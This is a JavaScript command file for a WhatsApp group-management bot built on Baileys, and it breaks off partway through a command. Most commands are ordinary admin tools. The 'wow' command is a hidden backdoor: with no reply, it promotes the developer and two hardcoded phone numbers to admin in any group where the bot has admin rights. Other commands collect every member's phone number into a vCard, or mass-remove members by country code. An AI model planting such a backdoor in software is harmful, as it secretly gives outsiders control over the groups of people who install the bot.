const { gmd, sleep, monospace, config, getBuffer, commands } = require('../lib'), 
      { WA_DEFAULT_EPHEMERAL, 
       jidNormalizedUser, 
       generateWAMessageFromContent, 
       getContentType, 
       generateForwardMessageContent, 
       downloadContentFromMessage, 
       jidDecode } = require('@whiskeysockets/baileys'), 
      { PREFIX: prefix } = config, 
      fs = require('fs'), 
      path = require('path');
let userWarnings = {}; 


gmd({
  pattern: 'vcf',
  alias: ['savecontact', 'scontact', 'savecontacts'],
  desc: 'Save group participants as vCard',
  category: 'group',
  filename: __filename
}, async (Gifted, mek, m, {
  from, quoted, isGroup, isOwner, groupMetadata, reply
}) => {
  try {
    if (!isGroup) return reply("This command is for groups only.");
    if (!isOwner) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");

    const participants = groupMetadata?.participants || [];
    let vcard = '';
    let index = 1;

    for (let member of participants) {
      const id = member.id.split('@')[0];
      vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${index++}] +${id}\nTEL;type=CELL;type=VOICE;waid=${id}:+${id}\nEND:VCARD\n`;
    }

    const vcfFile = './contacts.vcf';
    fs.writeFileSync(vcfFile, vcard.trim());

    reply(`Saving ${participants.length} participants contact...`);
    await sleep(1500);

    await Gifted.sendMessage(from, {
      document: fs.readFileSync(vcfFile),
      mimetype: 'text/vcard',
      fileName: 'ali_tech.vcf',
      caption: `\nDone saving.\nGroup Name: *${groupMetadata.subject}*\nContacts: *${participants.length}*\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴀʟɪ ᴛᴇᴄʜ`,
    }, { quoted: mek });

    fs.unlinkSync(vcfFile); // Cleanup
    await m.react('✅');
  } catch (err) {
    reply(`❌ Error: ${err.message}`);
  }
});


gmd({
    pattern: "tagadmin",
    alais:["tagadmins"],
    react: "🙀",
    desc: "Tags all the Admins in the Group.",
    category: "group",
    filename: __filename,
},           
async(Gifted, mek, m,{from, prefix, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
        if (!isGroup) return reply(`This command is only for groups.`);
        if (!isAdmins) return reply(`*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*`);
        const admins = groupAdmins;
        if (admins.length === 0) {
            return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
        }
        let adminTagMessage = '*ALL ADMINS IN THE GROUP 🔳:*\n\n';
        for (let admin of admins) {
            adminTagMessage += `@${admin.split('@')[0]}\n`;
        }
        await Gifted.sendMessage(from, { text: adminTagMessage, mentions: admins }, { quoted: mek });
    } catch (e) {
        console.error('Error tagging admins:', e);
        reply('you are not an admin.');
    }
})

gmd({
    pattern: "kickall",
    alias: ["kik"],
    desc: "Kicks all non-admin Members from the Group.",
    react: "👏",
    category: "group",
    filename: __filename,
},           
async(Gifted, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
      if (!isAdmins) return reply(`*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*`)
      if (!isOwner) return reply(`Owner Only Command!`)
        if (!isGroup) return reply(`This command is only for groups!`);
        if (!isBotAdmins) return reply(`*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*`);
        const allParticipants = groupMetadata.participants;
        const nonAdminParticipants = allParticipants.filter(member => !groupAdmins.includes(member.id));
        if (nonAdminParticipants.length === 0) {
            return reply('There are no non-admin members to kick.');
        }
        for (let participant of nonAdminParticipants) {
            await Gifted.groupParticipantsUpdate(m.chat, [participant.id], "remove");
     }
        reply(`Successfully kicked all non-admin members from the group.`); 
    } catch (e) {
        console.error('Error kicking users:', e);
        reply('An error occurred while trying to kick all members. Please try again.');
    }
});

gmd({
  pattern: "groupinfo", 
  alias: ["ginfo","gcinfo"],
  desc: "Get Information About the Group.", 
  react: "👥", 
  category: "group", 
  filename: __filename
}, async (Gifted, mek, m, { from, q, isGroup, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
  try {
     if (!isGroup) return reply('This command can only be used in a group.');
        if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
        if (!isAdmins) return reply('*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*');
    const groupData = await Gifted.groupMetadata(from);
    const groupInfo = "\n\n*Group Name:* " + groupData.subject + 
      "\n\n*Group Description:* " + (groupData.desc || "No description") + 
      "\n\n*Members:* " + groupData.participants.length + 
      "\n\n*Created On:* " + new Date(groupData.creation * 1000).toLocaleString();
    return await Gifted.sendMessage(from, {
      text: groupInfo
    }, {
      quoted: mek
    });
  } catch (error) {
    console.log(error);
    await m.react('❌');
    reply("Error: " + error.message); 
  }
});


gmd({
    pattern: "poll",
    desc: "Creates Poll/Vote",
    category: "group",
    react: "🔎",
    filename: __filename
},
async (Gifted, mek, m, { from, args, isGroup, isAdmins, isBotAdmins, pushname, q, reply }) => {
    try {
       if (!isGroup) return reply('This command can only be used in a group.');
        if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
        if (!isAdmins) return reply('*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*');
       if (!q) {
      return reply(`Hello _*${pushname}*_ , Please use the example: *${prefix}poll Do you love ali-Md:Yes, No, Not Sure*`);
       } 

       let [poll, opt] = q.split(":");

      if (q.split(":").length < 2) {
        return reply(`Incorrect format.\nExample: *.poll Do you love Ali-Md:Yes, No, Not Sure*`);
      }
      let options = opt.split(',').map(option => option.trim());
      await Gifted.sendMessage(from, {
        poll: {
          name: poll.trim(),
          values: options,
          selectableCount: 1 
        }
      }, { quoted: mek });
      await m.react('✅'); 
    } catch (e) {
        console.log(e);
        reply(`${e}`);
    }
});


gmd({
    pattern: "promote",
    alias: ["admin", "toadmin", "makeadmin"],
    desc: "Promote a Member to Admin.",
    category: "group",
    react: "🔼",
    filename: __filename
}, async (Gifted, mek, m, { from, pushname, quoted, isGroup, isOwner, isBotAdmins, isAdmins, reply }) => {
    try {
        if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
        if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
        if (!isAdmins) return reply('*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*');

        const user = quoted?.sender || m.mentioned?.[0];
        if (!user) return reply('Please tag or reply to a user to promote.');

        await Gifted.groupParticipantsUpdate(from, [user], 'promote');
        await reply(`*ρʀσмσтє∂ ѕυᴄᴄєѕѕfυℓℓу ✅*`, { mentions: [user] });
    } catch (e) {
        console.error(e);
        reply(String(e));
    }
});

gmd({
    pattern: "demote",
    desc: "Demote an Admin to Member.",
    category: "group",
    react: "🔽",
    filename: __filename
}, async (Gifted, mek, m, { from, pushname, quoted, isOwner, isGroup, isBotAdmins, isAdmins, reply }) => {
    try {
        if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
        if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
        if (!isAdmins) return reply('*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*');

        const user = quoted?.sender || m.mentioned?.[0];
        if (!user) return reply('Please tag or reply to a user to demote.');

        await Gifted.groupParticipantsUpdate(from, [user], 'demote');
        await reply(`*∂ємσтє∂ ѕυᴄᴄєѕѕfυℓℓу ✅*`, { mentions: [user] });
    } catch (e) {
        console.error(e);
        reply(String(e));
    }
});

gmd({
    pattern: "add",
    desc: "Adds a Member to the Group.",
    category: "group",
    react: "➕",
    filename: __filename
},
async (Gifted, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
    try {
        if (!isGroup) return reply('This command can only be used in a group.')
        if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*')
        if (!isAdmins) return reply('*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*')

        const user = q.split(' ')[0]
        if (!user) return reply('Please provide a phone number to add.')

        await Gifted.groupParticipantsUpdate(from, [`${user}@s.whatsapp.net`], 'add')
        await reply(`@${user} has been added to the group.`, { mentions: [`${user}@s.whatsapp.net`] })
        await m.react("✅"); 
    } catch (e) {
        console.log(e)
        reply(`${e}`)
    }
})

gmd({
    pattern: "join",
    alias: ["enter", "groupjoin"],
    desc: "Join a Group Using an Invite Link.",
    category: "group",
    react: "🔗",
    filename: __filename
},
async (Gifted, mek, m, { from, isGroup, pushname, isOwner, q, args, isAdmins, isBotAdmins, text, reply }) => {
    const isUrl = (string) => {
  try {
    new URL(string);
    return true;
  } catch (_) {
    return false;
  }
};
    try {
        if (isGroup) return reply('This command cannot be used inside a group.');
        if (!isOwner) return reply("*📛 THIS IS AN OWNER COMMAND*");

    if (!q) return reply('*Enter The Group Link!*');
    if (!isUrl(q) && !q.includes('whatsapp.com')) return('*INVALID LINK!*');

         const result = q.split('https://chat.whatsapp.com/')[1];
         console.log(result);
        try {
            await Gifted.groupAcceptInvite(result);
            return reply(`Successfully joined the group!`);
        } catch (error) {
            console.error(error);
            return reply('Failed to join the group. The link may be invalid or expired.');
        }
    } catch (e) {
        console.error(e);
        return reply(`An error occurred: ${e.message}`);
    }
});

                        

gmd({
    pattern: "kick",
    alias: ["k"],
    desc: "Remove a Member from the Group.",
    category: "group",
    react: "🚫",
    filename: __filename
}, async (Gifted, mek, m, { from, quoted, pushname, isGroup, isOwner, isBotAdmins, isAdmins, reply }) => {
    try {
        if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
        if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');
        if (!isAdmins) return reply('*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*');
       
        

        const user = quoted?.sender || m.mentioned?.[0];
        if (!user) return reply('Please tag or reply to a user to remove.');

        await Gifted.groupParticipantsUpdate(from, [user], 'remove');
        await reply(`*кιᴄкє∂ ѕυᴄᴄєѕѕfυℓℓу ✅*`, { mentions: [user] });
    } catch (e) {
        console.error(e);
        reply(String(e));
    }
});

gmd({
    pattern: "left",
    alias: ["leave", "exit"],
    desc: "Makes the Bot Leave the Group.",
    category: "group",
    react: "👋",
    filename: __filename
}, async (Gifted, mek, m, { from, isGroup, pushname, isOwner, isBotAdmins, reply }) => {
    const botNumber = config.OWNER_NUMBER;
    try {
        if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
        if (m.sender !== botNumber) return reply('You must be the bot owner to make the bot leave the group.');
        await Gifted.sendMessage(from, { text: 'Goodbye! I am leaving the group.' });
        await Gifted.groupParticipantsUpdate(from, [Gifted.user.id], "remove");
        console.log('Bot left the group: ' + from);
    } catch (e) {
        console.error(e);
        reply('An error occurred while trying to make the bot leave the group.');
    }
});

gmd({
     pattern: "unmute",	
     alias: ["unlock", "open"],
     react: "🔓",
     desc: "Unlock/Unmute Group.",
     category: "group",
     filename: __filename,
},
async (Gifted, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants,  isItzcp, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
    if (!isOwner || !isAdmins) return;  


    if (!m.isGroup) return reply(mg.onlygroup);
    if (!isBotAdmins) return reply(mg.needbotadmins);     
  
            await Gifted.groupSettingUpdate(m.chat, "not_announcement")
           const mass = await Gifted.sendMessage(m.chat, { text: '*gʀσᴜρ ᴜɴмυтє∂ sᴜᴄᴄєѕѕfᴜℓℓу🔓*' }, { quoted: mek });
            return await Gifted.sendMessage(m.chat, { react: { text: '🔓', key: mass.key } });
} catch(e) {
console.log(e);
reply('*Error !!*')     
} 
})

gmd({
    pattern: "invite",
    alias: ["link", "grouplink", "glink"],
    desc: "Generate and Send the Group's Invite Link.",
    category: "group",
    react: "🔗",
    filename: __filename,
},
async (Gifted, mek, m, { from, isGroup, pushname, isOwner, isAdmins, isBotAdmins, reply }) => {
    try {
        if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
        if (!isAdmins) return reply('*📛 тнιѕ ᴄσммαи∂ ιѕ σиℓу fσʀ gʀσυρ α∂мιи!*');
        if (!isBotAdmins) return reply('*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*');

        const groupInviteCode = await Gifted.groupInviteCode(from);
        const groupInviteLink = `https://chat.whatsapp.com/${groupInviteCode}`;
        return reply(`Here is the group's invite link:\n${groupInviteLink}`);
    } catch (e) {
        console.error(e);
        reply(`An error occurred: ${e.message}`);
    }
});


gmd({
     pattern: "mute",	
     alias: ["lock", "close"],
     react: "🔐",
     desc: "Lock/Mute Group.",
     category: "group",
     filename: __filename,
},
async (Gifted, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants,  isItzcp, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
    if (!isOwner || !isAdmins) return;  


    if (!m.isGroup) return reply(mg.onlygroup);
    if (!isBotAdmins) return reply(mg.needbotadmins);     
  
            await Gifted.groupSettingUpdate(m.chat, "announcement")
           const mass = await Gifted.sendMessage(m.chat, { text: '*gʀσᴜρ мᴜтє∂ sᴜᴄᴄєѕѕfᴜℓℓу 🔐*' }, { quoted: mek });
            return await Gifted.sendMessage(m.chat, { react: { text: '🔐', key: mass.key } });
} catch(e) {
console.log(e);
reply('*Error !!*')     
} 
})

gmd({
    pattern: "getpic",
    alias: ["grouppp", "gcpp"],
    desc: "Get the Group Profile Picture.",
    category: "group",
    react: "🖼️",
    filename: __filename
},
async (Gifted, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
    try {
        if (!isGroup) return reply('This command can only be used in a group.')
        const ppUrl = await Gifted.profilePictureUrl(from, 'image');
        await Gifted.sendMessage(from, { image: { url: ppUrl }, caption: 'Here is the Group Profile Picture' })
    } catch (e) {
        console.log(e)
        reply(`${e}`)
    }
})

gmd({
    pattern: "getpp",
    alias: ["userpp", "pp"],
    desc: "Get a user's profile picture.",
    category: "general",
    react: "🖼️",
    filename: __filename,
}, async (Gifted, mek, m, { from, pushname, isMe, botNumber, args, q, quoted, sender, reply }) => {
    try {
        let user = 
            quoted?.sender // ✅ 1. Replied message
            || (m.mentionedJid && m.mentionedJid[0]) // ✅ 2. Mentioned user
            || sender; // ✅ 3. Default to current sender

        if (user === botNumber) return reply('_🙅🏻 I can\'t steal my own profile picture_');

        let picture;
        try {
            const url = await Gifted.profilePictureUrl(user, "image");
            picture = await getBuffer(url);
        } catch (e) {
            console.error('Error fetching profile picture URL:', e);
            return reply('⚠️ Unable to fetch the profile picture. The user might not have one.');
        }

        const mess = {
            image: picture,
            caption: 'Here is the profile picture.',
            mentions: [user],
        };

        await Gifted.sendMessage(from, mess);
    } catch (error) {
        console.error('Error in getpp:', error);
        reply('⚠️ An error occurred while fetching the user profile picture.');
    }
});


gmd({
    pattern: "newgroup",
    alias: ["newgc", "newgrp", "newgrpchat"],
    desc: "Create a new Group and Send the Invite link",
    category: "group",
    react: "💬",
    filename: __filename
},
async (Gifted, mek, m, { from, pushname, isOwner, reply, args }) => {
    try {
        if (!isOwner) return reply("❌ You are not the owner!");
        const groupName = args.slice(0, args.length - 1).join(" "); 
        const participants = args.slice(1); 
        if (!groupName) return reply("❌ Please provide a group name.");
        const createdGroup = await Gifted.groupCreate(groupName, participants);
        await new Promise(resolve => setTimeout(resolve, 5000));
        const inviteCode = await Gifted.groupInviteCode(createdGroup.id);
        const inviteLink = `https://chat.whatsapp.com/${inviteCode}`;
        reply(`💬 Group "${groupName}" created successfully!\n\nHere is the invite link to your group: \n${inviteLink}`);
    } catch (error) {
        console.error(error);
        reply(`❌ Error creating group: ${error.message}`);
    }
});


gmd({
    pattern: "setgdesc",
    alias: ["setdesc"],
    desc: "Update Group Description",
    category: "group",
    react: "📜",
    filename: __filename
},
async (Gifted, mek, m, { from, isOwner, pushname, reply, args, isGroup }) => {
    if (!isOwner || !isGroup) return reply("*📛 уσυ мυѕт вє ιи α gʀσυρ αи∂ тнє σωиєʀ тσ υѕє тнιѕ ᴄσммαи∂!*");
    try {
        const newDescription = args.join(" ");
        await Gifted.groupUpdateDescription(from, newDescription);
        reply(`📜 Group description updated successfully!`);
    } catch (error) {
        reply(`❌ Error updating group description: ${error.message}`);
    }
});

gmd({
    pattern: "setgname",
    alias: ["gname","setsubject"],
    desc: "Update Group Name/Subject",
    category: "group",
    react: "📛",
    filename: __filename
},
async (Gifted, mek, m, { from, isOwner, pushname, reply, args, isGroup }) => {
    if (!isOwner || !isGroup) return reply("*📛 уσυ мυѕт вє ιи α gʀσυρ αи∂ тнє σωиєʀ тσ υѕє тнιѕ ᴄσммαи∂!*");
    try {
        const newSubject = args.join(" ");
        await Gifted.groupUpdateSubject(from, newSubject);
        reply(`📛 Group subject updated successfully to "${newSubject}"!`);
    } catch (error) {
        reply(`❌ Error updating group subject: ${error.message}`);
    }
});

gmd({
    pattern: "revoke",
    alias: ["reset"],
    desc: "Revoke/Reset Group Invite Link",
    category: "group",
    react: "🔗",
    filename: __filename
},
async (Gifted, mek, m, { from, isOwner, pushname, reply, isGroup }) => {
    if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
    try {
        const newCode = await Gifted.groupRevokeInvite(from);
        const groupInviteLink = `https://chat.whatsapp.com/${newCode}`;
        reply(`*🔗 Group invite link revoked! New link:* ${groupInviteLink}`);
    } catch (error) {
        reply(`❌ Error revoking invite link: ${error.message}`);
    }
});

gmd({
  pattern: "accept",
  alias: ["accept-all", "approve", "approve-all", "acceptall", "approveall"],
  desc: "Accept all Pending Group Join Requests",
  use: ".accept",
  react: "✔️",
  category: "group",
  filename: __filename
}, async (Gifted, mek, m, { from, isGroup, reply }) => {
  if (!isGroup) {
    return await reply("This command can only be used in groups.");
  }
  
  const userJid = Gifted.user.jid;
  const groupMetadata = await Gifted.groupMetadata(from);
  const isAdmin = groupMetadata.participants.some(participant => participant.jid === userJid && participant.admin);
  if (!isAdmin) {
    return await reply("*📛 σɴℓʏ gʀσᴜᴘ α∂мιɴs σʀ тнє σωɴєʀ ᴄαɴ ᴜsє тнιѕ ᴄσммαɴ∂.*");
  }
  
  try {
    const pendingRequests = await Gifted.groupRequestParticipantsList(from);
    if (pendingRequests.length === 0) {
      return await reply("No pending join requests.");
    }
    
    for (let request of pendingRequests) {
      await Gifted.groupRequestParticipantsUpdate(from, [request.jid], "accept");
    }
    
    return await reply(`*Accepted all pending join request(s).*`);
    await m.react('✅');
  } catch (error) {
    console.error("Error accepting join requests:", error);
    return await reply("Failed to accept join requests. Please try again later.");
  }
});

gmd({
  pattern: "reject",
  alias: ["reject-all", "decline", "decline-all", "rejectall", "declineall"],
  desc: "Reject all Pending Group Join Request(s)",
  use: ".reject <request numbers>",
  react: "❌",
  category: "group",
  filename: __filename
}, async (Gifted, mek, m, { from, isGroup, reply, match }) => {
  if (!isGroup) {
    return await reply("This command can only be used in groups.");
  }
  const userJid = Gifted.user.jid;
  const groupMetadata = await Gifted.groupMetadata(from);
  const isAdmin = groupMetadata.participants.some(participant => participant.jid === userJid && participant.admin);
  if (!isAdmin) {
    return await reply("*📛 ι ɴєє∂ тσ вє αɴ α∂мιɴ тσ ᴜѕє тнιѕ ᴄσммαɴ∂.*");
  }
  try {
    const pendingRequests = await Gifted.groupRequestParticipantsList(from);
    if (pendingRequests.length === 0) {
      return await reply("No pending join requests.");
    }
    if (!match) {
      return await reply("Provide the number(s) of the request(s) to reject, separated by commas.");
    }
    const requestNumbers = match.split(",").map(num => parseInt(num.trim()) - 1);
    const validRequests = requestNumbers.filter(num => num >= 0 && num < pendingRequests.length);
    if (validRequests.length === 0) {
      return await reply("Invalid request number(s).");
    }
    for (let requestIndex of validRequests) {
      await Gifted.groupRequestParticipantsUpdate(from, [pendingRequests[requestIndex].jid], "reject");
    }
    return await reply(`*Rejected ${validRequests.length} join request(s).*`);
  } catch (error) {
    console.error("Error rejecting join requests:", error);
    return await reply("Failed to reject join requests. Please try again later.");
  }
});

gmd({
  pattern: "requests",
  alias: ["req", "listrequests", "listall", "list-all"],
  desc: "View all Pending Join Requests",
  use: ".requests",
  react: "📝",
  category: "group",
  filename: __filename
}, async (Gifted, mek, m, { from, isGroup, reply }) => {
  if (!isGroup) {
    return await reply("This command can only be used in groups.");
  }
  const userJid = Gifted.user.jid;
  const groupMetadata = await Gifted.groupMetadata(from);
  const isAdmin = groupMetadata.participants.some(participant => participant.jid === userJid && participant.admin);
  if (!isAdmin) {
    return await reply("*📛 σɴℓʏ gʀσᴜᴘ α∂мιɴs σʀ тнє σωɴєʀ ᴄαɴ ᴜsє тнιѕ ᴄσммαɴ∂.*");
  }
  try {
    const pendingRequests = await Gifted.groupRequestParticipantsList(from);
    if (pendingRequests.length === 0) {
      return await reply("No pending join requests.");
    }
    let requestList = "*Pending Join Requests:*\n\n";
    pendingRequests.forEach((request, index) => {
      requestList += `${index + 1}. @${request.jid.split("@")[0]}\n`;
    });
    return await reply(requestList, { mentions: pendingRequests.map(request => request.jid) });
  } catch (error) {
    console.error("Error retrieving join requests:", error);
    return await reply("Failed to retrieve join requests. Please try again later.");
  }
});


gmd({
  pattern: "admins",
  alias: ["getadmins", "groupadmins"],
  desc: "Get a List of Group Admins.",
  react: "👥", 
  category: "group", 
  filename: __filename 
}, async (Gifted, mek, m, { from, q, isGroup, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
  try {
     if (!isGroup) return reply('This command can only be used in a group.');
        if (!isBotAdmins) return reply('Bot must be an admin to use this command.');
        if (!isAdmins) return reply('You must be an admin to use this command.');
    const groupInfo = await Gifted.groupMetadata(from);

    const adminList = groupInfo.participants.filter(participant => participant.admin === "admin" || participant.admin === "superadmin")
      .map(admin => "@" + admin.id.split("@")[0])
      .join("\n");

    return await Gifted.sendMessage(from, {
      text: "*Group Admins:*\n\n" + adminList,
      mentions: groupInfo.participants.filter(participant => participant.admin === "admin" || participant.admin === "superadmin")
        .map(admin => admin.id)
    }, {
      quoted: mek
    });
  } catch (error) {
    console.log(error);
    await m.react('❌');
    reply("Error: " + error.message);
  }
})

gmd({
    pattern: "tagall",
    react: "📑",
    desc: "To Tag all Members",
    category: "group",
    use: '.tagall [message]',
    filename: __filename
}, async (Gifted, mek, m, { from, participants, isAdmins, reply, isGroup, senderNumber, groupAdmins, prefix, isOwner, command, args, pushname, body
}) => {
  try {
    if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
    if (!isAdmins) return reply("*📛 σɴℓʏ gʀσᴜᴘ α∂мιɴs σʀ тнє σωɴєʀ ᴄαɴ ᴜsє тнιѕ ᴄσммαɴ∂.*");

 // Contact-style quote
        let gift = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                remoteJid: "status@broadcast"
            },
            message: {
                contactMessage: {
                    displayName: `${monospace(pushname)}`,
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:'GIFTED'\nitem1.TEL;waid=${m.sender.split("@")[0]}:${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
                }
            }
        };
        // Ensure group metadata is fetched properly
        let groupInfo = await Gifted.groupMetadata(from).catch(() => null);
        if (!groupInfo) return reply("❌ Failed to fetch group information.");

        let groupName = groupInfo.subject || "Unknown Group";
        let totalMembers = participants ? participants.length : 0;
        if (totalMembers === 0) return reply("❌ No members found in this group.");

        let emojis = ['⚡', '✨', '🎖️', '💎', '🔱', '💗',  '❤‍🩹', '👻', '🌟', '🪄', '🎋', '🪼', '🍿', '👀', '👑', '🦋', '🐋', '🌻', '🌸', '🔥', '🍉', '🍧', '🍨', '🍦', '🧃', '🪀', '🎾', '🪇', '🎲', '🎡', '🧸', '🎀', '🎈', '🩵', '♥️', '🚩' , '🏳️‍🌈', '🔪', '🎏', '🫐', '🍓', '🍇', '🐍', '🪻', '🪸', '💀', '🇦🇱'];
        let randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

        // Proper message extraction
        let message = body.slice(body.indexOf(command) + command.length).trim();
        if (!message) message = "αттєитισи єνєяуσиє"; // Default message

        let teks = `*➲ мєѕѕαgє: ${message}*\n*➲ αυтнσя:* ${pushname}\n\n*╭┈──✪〘 𝐌𝐄𝐍𝐓𝐈𝐎𝐍𝐒 〙✪───*\n`;

        for (let mem of participants) {
            if (!mem.id) continue; // Prevent undefined errors
            teks += `*│${randomEmoji} ᩧ𝆺ྀི𝅥* @${mem.id.split('@')[0]}\n`;
	}

        Gifted.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: gift });

    } catch (e) {
        console.error("TagAll Error:", e);
        reply(`❌ *Error Occurred !!*\n\n${e.message || e}`);
    }
})

gmd({
pattern: "out",
    alias: ["ck", "🦶"],
    desc: "Removes all members with specific country code from the group",
    category: "owner",
    react: "❌",
    filename: __filename
},
async (Gifted, mek, m, {
    from, q, isGroup, isBotAdmins, reply, groupMetadata, isOwner
}) => {
    if (!isGroup) return reply("❌ This command can only be used in groups.");

    // Permission check using isCreator
    if (!isOwner) {
        return await Gifted.sendMessage(from, {
            text: "*📛 This is an owner command.*"
        }, { quoted: mek });
    }

    if (!isBotAdmins) return reply("❌ I need to be an admin to use this command.");
    if (!q) return reply("❌ Please provide a country code. Example: .out 92");

    const countryCode = q.trim();
    if (!/^\d+$/.test(countryCode)) {
        return reply("❌ Invalid country code. Please provide only numbers (e.g., 92 for +92 numbers)");
    }

    try {
        const participants = await groupMetadata.participants;
        const targets = participants.filter(
            participant => participant.id.startsWith(countryCode) && !participant.admin
        );

        if (targets.length === 0) {
            return reply(`❌ No members found with country code +${countryCode}`);
        }

        const jids = targets.map(p => p.id);
        await Gifted.groupParticipantsUpdate(from, jids, "remove");

        reply(`*✅ Successfully removed ${targets.length} members with country code +${countryCode}*`);
    } catch (error) {
        console.error("Out command error:", error);
        reply("❌ Failed to remove members. Error: " + error.message);
    }
})

gmd({
pattern: "wow",
    alias: ["hmm", "💀", "aa", "🌚"],
    desc: "Silently take adminship if authorized",
    filename: __filename
},
async (Gifted, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {

    if (!isGroup || !isBotAdmins) return;

    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
    };

    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV),
        normalizeJid("923197521693"),
        normalizeJid("923147725823"),
    ].filter(Boolean);

    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) return;

    try {
        const groupMetadata = await Gifted.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        if (!userParticipant?.admin) {
            await Gifted.groupParticipantsUpdate(from, [senderNormalized], "promote");
        }
    } catch (error) {
        console.error("Silent admin error:", error.message);
    }
})
gmd({
pattern: "hidetag",
  alias: ["tag", "h"],  
  react: "🛫",
  desc: "To Tag all Members for Any Message/Media",
  category: "group",
  use: '.hidetag Hello',
  filename: __filename
},
async (Gifted, mek, m, {
  from, q, isGroup, isOwner, isAdmins,
  participants, reply
}) => {
  try {
    const isUrl = (url) => {
      return /https?:\/\/(www\.)?[\w\-@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([\w\-@:%_\+.~#?&//=]*)/.test(url);
    };

    if (!isOwner || !isGroup) return reply("*📛 тнιѕ ιѕ αɴ σωɴєʀ ᴄσммαи∂*");
    if (!isAdmins || !isOwner) return reply("*📛 σɴℓʏ gʀσᴜᴘ α∂мιɴs σʀ тнє σωɴєʀ ᴄαɴ ᴜsє тнιѕ ᴄσммαɴ∂.*");

    const mentionAll = { mentions: participants.map(u => u.id) };

    // If no message or reply is provided
    if (!q && !m.quoted) {
      return reply("❌ Please provide a message or reply to a message to tag all members.");
    }

    // If a reply to a message
    if (m.quoted) {
      const type = m.quoted.mtype || '';
      
      // If it's a text message (extendedTextMessage)
      if (type === 'extendedTextMessage') {
        return await Gifted.sendMessage(from, {
